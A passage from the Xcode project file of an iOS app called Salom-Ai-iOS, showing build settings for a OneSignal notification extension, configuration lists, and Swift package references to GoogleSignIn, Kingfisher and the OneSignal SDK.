				CODE_SIGN_ENTITLEMENTS = OneSignalNotificationExtension/OneSignalNotificationExtension.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 3TC3999J6N;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = OneSignalNotificationExtension/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = OneSignalNotificationExtension;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0.6;
				PRODUCT_BUNDLE_IDENTIFIER = "com.fera-tech.salom-ai.OneSignalNotificationExtension";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SDKROOT = iphoneos;
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		8C6723372EC36FFD0020C08B /* Build configuration list for PBXProject "Salom-Ai-iOS" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C6723452EC370000020C08B /* Debug */,
				8C6723462EC370000020C08B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8C6723482EC370000020C08B /* Debug */,
				8C6723492EC370000020C08B /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		8CCEA2932EDF4EAD007D2D0E /* Build configuration list for PBXNativeTarget "OneSignalNotificationExtension" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				8CCEA2942EDF4EAD007D2D0E /* Debug */,
				8CCEA2952EDF4EAD007D2D0E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		8C7650B92ED0472F003256A9 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/google/GoogleSignIn-iOS.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 9.0.0;
			};
		};
		8C7654B92ED4A7B4003256A9 /* XCRemoteSwiftPackageReference "Kingfisher" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/onevcat/Kingfisher.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 8.6.2;
			};
		};
		8CCEA3D32EDF5340007D2D0E /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/OneSignal/OneSignal-iOS-SDK";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.2.15;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		8C7650BA2ED0472F003256A9 /* GoogleSignIn */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8C7650B92ED0472F003256A9 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */;
			productName = GoogleSignIn;
		};
		8C7650BC2ED0472F003256A9 /* GoogleSignInSwift */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8C7650B92ED0472F003256A9 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */;
			productName = GoogleSignInSwift;
		};
		8C7654BA2ED4A7B4003256A9 /* Kingfisher */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8C7654B92ED4A7B4003256A9 /* XCRemoteSwiftPackageReference "Kingfisher" */;
			productName = Kingfisher;
		};
		8CCEA3D42EDF5340007D2D0E /* OneSignalExtension */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8CCEA3D32EDF5340007D2D0E /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
			productName = OneSignalExtension;
		};
		8CCEA3D62EDF5340007D2D0E /* OneSignalFramework */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8CCEA3D32EDF5340007D2D0E /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
			productName = OneSignalFramework;
		};
		8CCEA3D82EDF5340007D2D0E /* OneSignalInAppMessages */ = {
			isa = XCSwiftPackageProductDependency;
			package = 8CCEA3D32EDF5340007D2D0E /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
			productName = OneSignalInAppMessages;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 8C6723342EC36FFD0020C08B /* Project object */;
}
